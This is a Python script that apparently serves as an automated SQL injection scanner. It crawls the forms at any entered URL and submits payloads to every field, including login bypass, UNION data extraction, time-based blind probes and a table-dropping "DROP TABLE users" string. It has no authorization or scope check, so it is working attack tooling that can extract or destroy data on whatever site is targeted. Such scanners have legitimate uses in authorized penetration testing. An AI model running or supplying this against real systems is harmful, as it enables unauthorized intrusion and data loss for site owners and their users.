import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time

# List of SQL injection payloads, including time-based (blind) injections
payloads = [
    "' OR '1'='1",
    "' OR SLEEP(5)--",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users; --",
    "' UNION SELECT 1, database()--",
]

# Common SQL error messages to detect
error_messages = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "mysql_fetch",
    "syntax error",
    "ORA-01756",
    "SQLSTATE",
    "Microsoft OLE DB Provider for ODBC Drivers",
]

def is_external_url(url, base_url):
    # Parse the form action URL and the base URL to compare their domains
    parsed_url = urlparse(url)
    parsed_base = urlparse(base_url)
    return parsed_url.netloc and parsed_url.netloc != parsed_base.netloc

def scan_sql_injection(url):
    print(f"Scanning {url} for SQL Injection vulnerabilities...")

    # Open a file to log the results
    with open('scan_results.txt', 'a') as log_file:
        log_file.write(f"Starting SQL Injection scan for {url}\n\n")

    # Send a GET request to the URL
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all forms on the page
    forms = soup.find_all('form')
    print(f"Detected {len(forms)} form(s) on {url}")

    # Iterate through each form
    for i, form in enumerate(forms, start=1):
        action = form.get('action')
        method = form.get('method', 'get').lower()

        # Resolve relative URLs in form action
        action_url = urljoin(url, action)

        # Skip external forms (e.g., PayPal forms)
        if is_external_url(action_url, url):
            print(f"Skipping external form with action URL: {action_url}")
            continue

        print(f"\nForm #{i}:")
        print(f"Form action URL: {action_url}")
        print(f"Form method: {method}")

        # Get input fields (excluding submit buttons and hidden inputs)
        inputs = form.find_all(['input', 'textarea'])
        input_names = [input.get('name') for input in inputs if input.get('name') and input.get('type') != 'submit']

        print(f"Input fields found: {input_names}")

        # Prepare form data dictionary
        form_data = {}
        for input_field in inputs:
            input_name = input_field.get('name')
            if input_name:
                form_data[input_name] = ""

        # Test each input field with each payload
        for payload in payloads:
            for input_name in input_names:
                # Clone the form data and inject the payload
                data = form_data.copy()
                data[input_name] = payload

                print(f"\nTesting field '{input_name}' with payload: {payload}")

                # Log to the file
                with open('scan_results.txt', 'a') as log_file:
                    log_file.write(f"Testing field '{input_name}' with payload: {payload}\n")

                # Send the request based on the form method
                start_time = time.time()
                if method == 'post':
                    result = requests.post(action_url, data=data)
                else:
                    result = requests.get(action_url, params=data)
                end_time = time.time()

                # Check for time-based blind SQL injection
                elapsed_time = end_time - start_time
                if elapsed_time > 4:  # If it takes longer than 4 seconds, it's likely blind SQLi
                    print(f"[!] Potential Blind SQL Injection vulnerability detected in '{input_name}'")
                    with open('scan_results.txt', 'a') as log_file:
                        log_file.write(f"[!] Potential Blind SQL Injection vulnerability detected in '{input_name}' with payload: {payload}\n")
                        log_file.write(f"Response Time: {elapsed_time} seconds\n\n")

                # Check for SQL errors in the response
                for error_message in error_messages:
                    if error_message.lower() in result.text.lower():
                        print(f"[!] Potential SQL Injection vulnerability detected in '{input_name}'")
                        with open('scan_results.txt', 'a') as log_file:
                            log_file.write(f"[!] Potential SQL Injection vulnerability detected in '{input_name}' with payload: {payload}\n")
                            log_file.write(f"Error Message: {error_message}\n")
                            log_file.write(f"Response Snippet: {result.text.strip()[:200]}\n\n")
                        break  # Stop checking error messages if one is found
                else:
                    print(f"No SQL Injection detected for '{input_name}' with payload: {payload}")
                    with open('scan_results.txt', 'a') as log_file:
                        log_file.write(f"No SQL Injection detected for '{input_name}' with payload: {payload}\n")

    print("\nScanning completed.")

# Example usage
if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    scan_sql_injection(target_url)
